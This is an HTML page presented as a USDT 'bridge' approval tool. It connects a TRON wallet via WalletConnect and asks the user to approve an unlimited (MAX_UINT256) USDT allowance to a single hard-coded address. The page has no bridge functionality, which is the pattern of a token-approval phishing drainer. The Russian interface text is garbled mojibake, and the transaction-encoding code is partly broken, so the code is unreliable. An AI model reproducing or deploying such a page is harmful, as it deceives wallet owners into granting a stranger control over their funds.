<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Approve USDT for Bridge</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect/dist/index.umd.min.js"></script>
</head>
<body>
  <h2>Approve USDT –¥–ª—è Bridge</h2>
  <button id="connect">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
  <button id="approve" disabled>–û–¥–æ–±—Ä–∏—Ç—å USDT</button>

  <p id="status"></p>

  <script type="module">
    import { WalletConnectWallet } from "https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect/dist/index.esm.min.js";

    const wallet = new WalletConnectWallet({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.org',
        projectId: 'example', // –º–æ–∂–Ω–æ —Å–≤–æ–π projectId, –Ω–æ –∏ —Ç–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç
        metadata: {
          name: "USDT Approver",
          description: "Approve USDT to Bridge",
          url: "https://n3tree.github.io",
          icons: ["https://n3tree.github.io/icon.png"]
        }
      }
    });

    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BRIDGE_ADDRESS = "TXN5uDg2D5bvpC91AUG1YP63rag775HfHg";
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const status = document.getElementById("status");
    const connectBtn = document.getElementById("connect");
    const approveBtn = document.getElementById("approve");

    connectBtn.onclick = async () => {
      try {
        await wallet.connect();
        status.innerText = `‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${wallet.address}`;
        approveBtn.disabled = false;
      } catch (err) {
        console.error(err);
        status.innerText = `‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: ${err.message}`;
      }
    };

    approveBtn.onclick = async () => {
      try {
        const tx = await wallet.sendTransaction({
          to: USDT_CONTRACT,
          data: window.tronWeb ? window.tronWeb.toHex(`approve(address,uint256)`): '0x095ea7b3',
          abi: [
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "spender",
                  "type": "address"
                },
                {
                  "internalType": "uint256",
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "name": "approve",
              "outputs": [
                {
                  "internalType": "bool",
                  "name": "",
                  "type": "bool"
                }
              ],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          params: [BRIDGE_ADDRESS, MAX_UINT256]
        });

        status.innerText = `üöÄ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞: ${tx}`;
      } catch (err) {
        console.error(err);
        status.innerText = `‚ùå –û—à–∏–±–∫–∞ approve: ${err.message}`;
      }
    };
  </script>
</body>
</html>
